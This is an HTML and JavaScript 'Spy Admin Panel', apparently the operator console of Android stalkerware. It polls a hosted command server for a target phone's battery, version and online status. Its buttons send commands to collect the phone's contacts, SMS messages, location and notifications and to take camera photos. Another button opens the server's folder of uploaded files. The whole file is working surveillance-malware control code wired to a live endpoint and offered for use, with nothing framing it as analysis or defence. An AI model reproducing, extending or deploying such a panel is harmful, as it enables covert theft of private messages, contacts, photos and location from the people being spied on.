<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #050505;
            --card-bg: #111;
            --text-main: #fff;
            --accent: #00ff88; /* Hacker Green */
            --danger: #ff3333;
            --glass: rgba(255, 255, 255, 0.05);
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 100%; max-width: 420px;
            background: var(--card-bg);
            border-radius: 20px; padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
            border: 1px solid #333;
        }

        /* Input for ID */
        .id-input-group {
            display: flex; gap: 10px; margin-bottom: 20px;
        }
        input#targetId {
            background: #222; border: 1px solid #444; color: var(--accent);
            padding: 10px; border-radius: 10px; width: 100%; text-align: center;
            font-weight: bold; letter-spacing: 1px;
        }

        /* Status Header */
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .status-badge {
            background: #1a1a1a; padding: 5px 12px; border-radius: 20px;
            font-size: 0.8rem; display: flex; align-items: center; gap: 8px;
            border: 1px solid #333;
        }
        .dot { height: 8px; width: 8px; border-radius: 50%; background: #555; }
        .dot.online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
        .dot.offline { background: var(--danger); }

        /* Info Cards */
        .info-panel { display: flex; gap: 10px; margin-bottom: 15px; }
        .info-card {
            flex: 1; background: var(--glass); padding: 10px;
            border-radius: 12px; text-align: center; border: 1px solid #333;
        }
        .label { font-size: 0.6rem; color: #888; text-transform: uppercase; }
        .value { font-size: 0.9rem; font-weight: bold; margin-top: 5px; }

        /* Battery */
        .battery-sec { background: #1a1a1a; padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
        .bat-bar { width: 100%; height: 8px; background: #333; border-radius: 5px; overflow: hidden; margin-top: 10px; }
        .bat-fill { height: 100%; width: 0%; background: var(--accent); transition: 0.5s; }

        /* Grid Controls */
        .controls-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .btn {
            background: var(--glass); border-radius: 12px; padding: 15px;
            display: flex; flex-direction: column; align-items: center; gap: 8px;
            cursor: pointer; border: 1px solid #333; transition: 0.2s;
            color: #ddd; text-decoration: none;
        }
        .btn:hover { background: rgba(0, 255, 136, 0.1); border-color: var(--accent); color: var(--accent); }
        .btn:active { transform: scale(0.95); }
        .btn i { font-size: 1.4rem; }
        .btn span { font-size: 0.7rem; }

        /* Toast Notification */
        #toast {
            visibility: hidden; min-width: 250px; background-color: #333; color: #fff;
            text-align: center; border-radius: 5px; padding: 16px; position: fixed;
            z-index: 1; left: 50%; bottom: 30px; transform: translateX(-50%);
            border-left: 5px solid var(--accent);
        }
        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
        
        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
    </style>
</head>
<body>

    <div class="container">
        <div class="id-input-group">
            <input type="text" id="targetId" value="M2103K19I" placeholder="Enter Device ID Here">
        </div>

        <div class="header">
            <div style="font-weight: bold; color: var(--accent);">
                <i class="fa-brands fa-android"></i> <span id="modelName">Waiting...</span>
            </div>
            <div class="status-badge">
                <span id="statusDot" class="dot"></span>
                <span id="statusText">Disconnected</span>
            </div>
        </div>

        <div class="info-panel">
            <div class="info-card">
                <div class="label">Battery</div>
                <div class="value" id="batLevel">--%</div>
            </div>
            <div class="info-card">
                <div class="label">Version</div>
                <div class="value" id="androidVer">--</div>
            </div>
            <div class="info-card">
                <div class="label">Last Seen</div>
                <div class="value" id="lastSeen">--:--</div>
            </div>
        </div>

        <div class="battery-sec">
            <div style="display:flex; justify-content:space-between; font-size:0.8rem;">
                <span style="color:#888;">Power Status</span>
                <span id="chargingStatus" style="color:var(--text-main);">Unknown</span>
            </div>
            <div class="bat-bar">
                <div id="batFill" class="bat-fill"></div>
            </div>
        </div>

        <div class="controls-grid">
            <div class="btn" onclick="sendCommand('contacts')">
                <i class="fa-solid fa-address-book" style="color: #4facfe;"></i>
                <span>Get Contacts</span>
            </div>
            
            <div class="btn" onclick="sendCommand('sms')">
                <i class="fa-solid fa-comments" style="color: #f093fb;"></i>
                <span>Get SMS</span>
            </div>
            
            <div class="btn" onclick="sendCommand('location')">
                <i class="fa-solid fa-location-dot" style="color: #ff6b6b;"></i>
                <span>Get Location</span>
            </div>

            <div class="btn" onclick="sendCommand('notifications')">
                <i class="fa-solid fa-bell" style="color: #ffd200;"></i>
                <span>Get Notifs</span>
            </div>

            <div class="btn" onclick="sendCommand('camera')">
                <i class="fa-solid fa-camera" style="color: #00ff88;"></i>
                <span>Take Photo</span>
            </div>

            <div class="btn" onclick="openUploads()">
                <i class="fa-solid fa-folder-open"></i>
                <span>View Files</span>
            </div>
        </div>
    </div>

    <div id="toast">Command Sent Successfully!</div>

    <script>
        const API_URL = "https://child-v9no.onrender.com/api"; // Tumhara Render URL

        // 1. Status Check Loop (Har 3 sec)
        setInterval(checkStatus, 3000);

        async function checkStatus() {
            const id = document.getElementById('targetId').value;
            if(!id) return;

            try {
                const res = await fetch(`${API_URL}/device-status/${id}`);
                const data = await res.json();

                // UI Update
                document.getElementById('modelName').innerText = data.model || id;
                document.getElementById('androidVer').innerText = data.version || "--";
                document.getElementById('batLevel').innerText = (data.battery || 0) + "%";
                document.getElementById('batFill').style.width = (data.battery || 0) + "%";
                
                // Last Seen Time
                if(data.lastSeen) {
                    const date = new Date(data.lastSeen);
                    document.getElementById('lastSeen').innerText = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                }

                // Online/Offline Dot
                const dot = document.getElementById('statusDot');
                const txt = document.getElementById('statusText');
                if(data.isOnline) {
                    dot.className = "dot online";
                    txt.innerText = "Online";
                    txt.style.color = "#00ff88";
                } else {
                    dot.className = "dot offline";
                    txt.innerText = "Offline";
                    txt.style.color = "#ff3333";
                }

                document.getElementById('chargingStatus').innerText = data.charging ? "‚ö° Charging" : "On Battery";

            } catch (e) {
                console.log("Server error or connecting...");
            }
        }

        // 2. Send Command Function
        async function sendCommand(cmd) {
            const id = document.getElementById('targetId').value;
            showToast(`üöÄ Sending: ${cmd}...`);

            try {
                const res = await fetch(`${API_URL}/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: id, command: cmd })
                });
                const result = await res.json();
                
                if(result.status === "success") {
                    showToast(`‚úÖ Sent! Wait for data.`);
                } else {
                    showToast(`‚ùå Error: ${result.message}`);
                }
            } catch (e) {
                showToast("‚ùå Server Disconnected");
            }
        }

        // 3. View Files Folder
        function openUploads() {
            window.open("https://child-v9no.onrender.com/uploads/", "_blank");
        }

        // 4. Popup Helper
        function showToast(msg) {
            const x = document.getElementById("toast");
            x.innerText = msg;
            x.className = "show";
            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
        }

        // Run once on load
        checkStatus();
    </script>
</body>
</html>
